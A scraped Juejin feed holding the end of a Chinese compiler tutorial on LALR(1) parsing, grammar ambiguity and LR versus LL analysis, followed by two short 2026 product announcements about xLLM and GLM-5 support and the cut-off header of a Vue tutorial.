<p>B→aB·,a/b/$，r2</p>
<p>对应的分析表：</p>
<p>a</p>
<p>b</p>
<p>$</p>
<p>S</p>
<p>B</p>
<p>0</p>
<p>3,6</p>
<p>4,7</p>
<p>1</p>
<p>2</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>3,6</p>
<p>4,7</p>
<p>5</p>
<p>3,6</p>
<p>3,6</p>
<p>4,7</p>
<p>8,9</p>
<p>4,7</p>
<p>r3</p>
<p>r3</p>
<p>r3</p>
<p>5</p>
<p>r1</p>
<p>8,9</p>
<p>r2</p>
<p>r2</p>
<p>r2</p>
<p>合并后没有任何冲突发生，说明这个方法是work的，状态得到了削减！</p>
<p>命个什么名好呢。。这个算法合并了LR(1)中内核相同的状态，那干脆就叫LA（kerneL Aggregation）LR(1)吧！</p>
<p>……</p>
<p>师傅看完递交上来的三个算法方案，随口吐槽道：“前面两个暂且不说，光看你这LALR(1)，我还以为是Look-Ahead LR(1)呢，不过想想那个1已经是向前看一个符号的意思了，想必你也不会脱裤子放屁多讲一遍。</p>
<p>另外我感觉你这LALR(1)虽说是少了状态了，但是它解决冲突的能力应该是要差过LR(1)?”</p>
<p>嗯是的，在极端情况下如果LR(1)原来的状态中如果有如下两个状态：</p>
<ul>
<li>
<p>状态 1：</p>
</li>
<li>
<p>A-&gt;α·，{a}</p>
</li>
<li>
<p>B-&gt;β·，{b}</p>
</li>
<li>
<p>状态 2：</p>
</li>
<li>
<p>A-&gt;α·，{b}</p>
</li>
<li>
<p>B-&gt;β·，{a//其实这里是啥已经不重要了}</p>
</li>
</ul>
<p>这样合并之后A-&gt;α·的归约条件集合就一定会和B-&gt;β·的有非空交集，归约-归约的纷争就开始了。</p>
<p>相反，合并内核是绝对不会产生移进-归约冲突的。</p>
<p>原因在于：要产生移进归约项目，说明这个状态内部本来就要有移进项目。合并状态之后，也只是把它们的归约条件合并了。只要原来没有冲突，那么说明这个移进项目等待移进的符号与原始状态的归约项目的条件不会冲突，所以合并后也绝对不会冲突。</p>
<p>一旦合并后有冲突产生的, 就不叫LALR(1)文法；</p>
<p>只有合并后没有出现冲突的，才叫LALR(1)文法。</p>
<p>他们四兄弟按能力排序应为：LR(1)⊇LALR(1) ⊇ SLR(1) ⊇ LR(0)</p>
<p>师傅心中os：“为啥用包含号不用大于号来着？啊对，这是四大类文法，是四个集合，比大小得用包含符号。”</p>
<h3 data-id="heading-13">6. 二义性及其处理</h3>
<p>既然自顶向下语法分析、自底向上语法分析都开发完成了，两人目光便又落在那个一切的开端，if else文法。似乎只要解决这一切，客户的其他问题便都能迎刃而解。</p>
<p>(习题5)</p>
<p>S→if B S | if B S else S</p>
<p>给出句型if B if B S else S的语法树。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06f78d386df341198ada825741a18196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=YNIeQ84n1NrTOXfE4oBYtIi%2B2Pk%3D" alt="" loading="lazy"/><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/933de6295f1b4584836baa524f06b24f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pCe56yR5YO15bC45oCd6ICD5pe26Ze0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771550852&amp;x-signature=8qcK6IRdT8lxHUZ2jWDkz%2Bs%2FvH0%3D" alt="" loading="lazy"/></p>
<p>啊，这，都不是LR(1)文法，分析个屁╮(￣▽￣)╭，连这么简单的文法都搞不定，搞了这么久白忙活了。果然这语法写得太过简单就是在为难我胖虎编译器。要是写成if end或者end if这样的形式就容易分析多了。</p>
<p>师傅：“哈哈毕竟编译器的工作就是为人类服务嘛。等一下，我感觉倒也不用灰心，我发现他的LR(0)分析表还挺有意思的。你看，歧义就只出现在(4,'else')这个格子里。</p>
<p>if</p>
<p>B</p>
<p>S</p>
<p>else</p>
<h2 data-id="heading-14"/>
<p>0</p>
<p>2</p>
<p>1</p>
<p>1</p>
<p>acc</p>
<p>2</p>
<p>3</p>
<p>3</p>
<p>2</p>
<p>4</p>
<p>4</p>
<p>5,r1</p>
<p>r1</p>
<p>5</p>
<p>2</p>
<p>6</p>
<p>6</p>
<p>r2</p>
<p>r2</p>
<p>你之前的LR系列文法出现冲突其实都是同样的问题对吧？那时候都觉得无法处理是因为我们不知道什么时候该走那条路，因为文法太抽象了。但对于if else，咱们可以引入一些规则来辅助判断呀！</p>
<p>比如，可以要求写代码的人记住‘if只跟最近的else匹配’。一旦加上这条规则，意味着只要if看到后面有else，就决不会自绝于代码中，这样咱们直接就把这个格子中的r1去掉就好啦。别愣着了，规则是人定的，树挪死人挪活。“</p>
<p>师傅我突然想起九品芝麻官中那个歧义梗：”年租银两三十万不能转租别人“不是有两种解读方式嘛？现在看到这个语法树我才明白，这所谓文法的歧义就是指文法本身有问题，会导致一句话可以对应多棵语法树！</p>
<p>师傅点点头：“你这么一说，之前正则文法说是对应正则语言。那文法对应的也应该是语言。如果文法会导致歧义，那我估计有些语言天生就是带有歧义的，无论你用什么文法去描述都有歧义。</p>
<p>关键是，我感觉这歧义最麻烦的是没有通用算法直接判定，唯一能做的就是反证法，直接举个反例，说这里有个句子有多个语法树，然后这个文法就是带歧义了。</p>
<p>不管怎么说，咱们也算是把if else这个Boss给解决了！”</p>
<h3 data-id="heading-15">7.和LL文法的对比</h3>
<p>“所以，你们搞出来的这个LR分析，到底比前面的LL强在了哪里？”老板还是有点没搞懂。</p>
<p>简单来讲，LL(k)即使k很大很大，那也是一个有限值。也就是说，它的目光是有限的。而LR分析技术，它就像个闷骚怪，先不声不响吸收了一大堆知识，等到他觉得可以做决定的时候再进行消化。这样他就具有了后手优势，总是会比先手的LL类要少出错。也就是说，它们的能力并不等价。</p>
<p>“但你说的这个出错我觉得核心在于你限制了它不能犯错吧？只要我允许它犯错并回溯，这样的话两者应该是完全等价的才对。”</p>
<p>您说得挺有道理，如果允许无限回溯，那么它们对上下文无关语言的识别上确实是等价的。经您这一提醒，我感觉LR有一个问题就是全部转成状态之后，代码太抽象太难调试了。如果可以让LL分析真的像DFS那样自顶向下一层一层递归解析，感觉写起来也不复杂呐。虽然说可能又让代码与逻辑灵肉纠缠了，但只要语言没有变态性的发育，这么点小修补应该还是能接受的。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025·xLLM开源项目年度总结]]></title>    <link>https://juejin.cn/post/7605625595570487311</link>    <guid>https://juejin.cn/post/7605625595570487311</guid>    <pubDate>2026-02-13T02:29:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605625595570487311" data-draft-id="7605542907118878772" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025·xLLM开源项目年度总结"/> <meta itemprop="keywords" content="开源"/> <meta itemprop="datePublished" content="2026-02-13T02:29:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="京东零售技术"/> <meta itemprop="url" content="https://juejin.cn/user/4233576972293643"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025·xLLM开源项目年度总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4233576972293643/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    京东零售技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:29:03.000Z" title="Fri Feb 13 2026 02:29:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>xLLM 实现 Day0 支持智谱 GLM-5 大模型，深度优化华为昇腾推理性能。用户即日起可在 xLLM 中直接体验 GLM-5 的卓越性能，尤其针对华为昇腾平台完成了深度推理优化，推理效率显著提升。这是 xLLM 在国产芯片适配领域迈出的又一关键步伐。</p>
<p>回望2025年8月开源以来，xLLM 已全面完成对昇腾、寒武纪、摩尔线程、天数智芯等主流国产芯片的深度适配与优化，覆盖大语言模型、多模态、文生图及生成式推荐等核心AI场景，并在关键模型上取得高吞吐、低延迟的性能突破。通过与头部模型厂商的深度协同，我们实现从通用大模型到专业领域模型的快速支持，持续降低国产AI落地的门槛。</p>
<p>迈向2026，xLLM 期待与各位继续携手，共同推动开源 AI Infra 生态的繁荣与发展。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/059c61309a9845b0b06466ec9d82e72d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic6Zu25ZSu5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771554542&amp;x-signature=sAfEKZlG6mj6h1tDXTQJu7yX4LM%3D" alt="2.12.jpg" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[百度文心快码全面支持GLM-5]]></title>    <link>https://juejin.cn/post/7605542907118944308</link>    <guid>https://juejin.cn/post/7605542907118944308</guid>    <pubDate>2026-02-13T02:42:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605542907118944308" data-draft-id="7605772919224533026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="百度文心快码全面支持GLM-5"/> <meta itemprop="keywords" content="前端,人工智能"/> <meta itemprop="datePublished" content="2026-02-13T02:42:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="文心快码BaiduComate"/> <meta itemprop="url" content="https://juejin.cn/user/992209294070809"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            百度文心快码全面支持GLM-5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/992209294070809/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    文心快码BaiduComate
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:42:35.000Z" title="Fri Feb 13 2026 02:42:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>百度文心快码今天全面支持GLM-5。作为面向复杂系统工程优化的新一代模型，GLM-5进一步强化了Coding Agent在真实研发场景中的持续执行能力。</p>
<p>基于GLM-5在推理能力、代码理解与任务规划方面的显著提升，文心快码在跨文件分析、问题修复、多步骤开发等复杂工程场景中实现了更高质量的任务执行，在开发过程中更高效完成从需求理解、任务拆解到结果交付的工程闭环，帮助开发者提升复杂任务处理效率与质量。</p>
<p>目前，Comate已在IDE及插件端全面集成GLM-5，深度赋能开发全流程。</p>
<p>诚邀大家即刻体验，反馈使用感受！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a59d4d90c0fe41e7aafa0839bcacda54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771555355&amp;x-signature=0ScjlavsBqfZDoCtMS4%2BNKcHpE0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 实战：从零实现“划词标注”与“高亮笔记”功能]]></title>    <link>https://juejin.cn/post/7605817795628531762</link>    <guid>https://juejin.cn/post/7605817795628531762</guid>    <pubDate>2026-02-13T02:42:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605817795628531762" data-draft-id="7605769126272057390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 实战：从零实现“划词标注”与“高亮笔记”功能"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-13T02:42:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="皮蛋小精灵"/> <meta itemprop="url" content="https://juejin.cn/user/219558056559278"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue 实战：从零实现“划词标注”与“高亮笔记”功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/219558056559278/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    皮蛋小精灵
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:42:35.000Z" title="Fri Feb 13 2026 02:42:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body 